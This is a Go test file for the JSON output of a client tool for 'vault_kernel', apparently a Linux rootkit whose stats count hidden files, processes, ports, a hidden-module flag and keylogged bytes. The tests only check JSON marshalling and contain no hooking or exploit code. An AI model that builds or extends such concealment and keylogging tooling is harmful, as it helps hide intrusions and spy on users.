package main

import (
	"encoding/json"
	"testing"

	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
)

// marshalStatsJSON owns the `stats --json` envelope: schema first-class,
// numeric values as numbers, the rest as strings.
func TestMarshalStatsJSON(t *testing.T) {
	raw := map[string]string{
		"module":          "vault_kernel",
		"version":         "3.7",
		"hooks_installed": "7",
		"hooks_planned":   "7",
		"module_hidden":   "0",
		"hidden_files":    "1",
		"hidden_pids":     "1",
		"hidden_ports":    "1",
		"keylog_bytes":    "0",
		"uptime_s":        "42",
	}
	j, err := marshalStatsJSON(raw)
	if err != nil {
		t.Fatalf("marshalStatsJSON: %v", err)
	}
	var out map[string]interface{}
	if err := json.Unmarshal(j, &out); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, j)
	}
	if out["schema"].(float64) != 1 {
		t.Errorf("schema = %v, want 1", out["schema"])
	}
	for _, k := range []string{"hooks_installed", "hooks_planned",
		"hidden_files", "hidden_pids", "hidden_ports",
		"keylog_bytes", "uptime_s", "module_hidden", "schema"} {
		if _, ok := out[k].(float64); !ok {
			t.Errorf("%s should marshal as a number, got %T (%v)", k, out[k], out[k])
		}
	}
	if out["module"] != "vault_kernel" || out["version"] != "3.7" {
		t.Errorf("string values mangled: module=%v version=%v", out["module"], out["version"])
	}
}

// marshalHiddenJSON owns the `list --json` envelope: schema + the three
// sections, empty ones as [] (never null).
func TestMarshalHiddenJSON(t *testing.T) {
	hl := ioctl.HiddenList{
		PIDs:  []int{1234, 567},
		Files: []string{"secret.txt", "my dir/with space.txt"},
		Ports: []int{8080},
	}
	j, err := marshalHiddenJSON(hl)
	if err != nil {
		t.Fatalf("marshalHiddenJSON: %v", err)
	}
	var out struct {
		Schema int      `json:"schema"`
		PIDs   []int    `json:"pids"`
		Files  []string `json:"files"`
		Ports  []int    `json:"ports"`
	}
	if err := json.Unmarshal(j, &out); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, j)
	}
	if out.Schema != 1 {
		t.Errorf("schema = %d, want 1", out.Schema)
	}
	if len(out.PIDs) != 2 || out.PIDs[0] != 1234 || len(out.Files) != 2 ||
		out.Files[1] != "my dir/with space.txt" || len(out.Ports) != 1 {
		t.Errorf("sections mangled: %+v", out)
	}

	empty := ioctl.HiddenList{PIDs: []int{}, Files: []string{}, Ports: []int{}}
	je, err := marshalHiddenJSON(empty)
	if err != nil {
		t.Fatalf("marshalHiddenJSON(empty): %v", err)
	}
	if string(je) == "" || json.Valid(je) == false {
		t.Fatalf("empty envelope invalid: %s", je)
	}
	var outE map[string]interface{}
	json.Unmarshal(je, &outE)
	for _, k := range []string{"pids", "files", "ports"} {
		if arr, ok := outE[k].([]interface{}); !ok || len(arr) != 0 {
			t.Errorf("empty %s must marshal as [], got %v", k, outE[k])
		}
	}
}

// The doctor envelope always carries schema + client_version, and the
// v3.7 parity fix keeps device_open/stats_responds present (as false)
// when their check ran and failed — pointer fields, so they only
// disappear when the check never ran.
func TestDoctorJSONEnvelopeParity(t *testing.T) {
	openOK := false
	statsOK := false
	rep := doctorReport{
		Schema:        jsonSchemaVersion,
		ClientVersion: clientVersion,
		DevicePresent: true,
		DeviceOpen:    &openOK,
		StatsResponds: &statsOK,
		Warnings:      2,
	}
	j, err := json.MarshalIndent(&rep, "", "  ")
	if err != nil {
		t.Fatalf("marshal doctorReport: %v", err)
	}
	var out map[string]interface{}
	if err := json.Unmarshal(j, &out); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, j)
	}
	if out["schema"].(float64) != 1 {
		t.Errorf("schema = %v, want 1", out["schema"])
	}
	if out["client_version"] != clientVersion {
		t.Errorf("client_version = %v, want %s", out["client_version"], clientVersion)
	}
	if b, ok := out["device_open"].(bool); !ok || b {
		t.Errorf("device_open must be present and false on failed open, got %v", out["device_open"])
	}
	if b, ok := out["stats_responds"].(bool); !ok || b {
		t.Errorf("stats_responds must be present and false on failed stats, got %v", out["stats_responds"])
	}
}
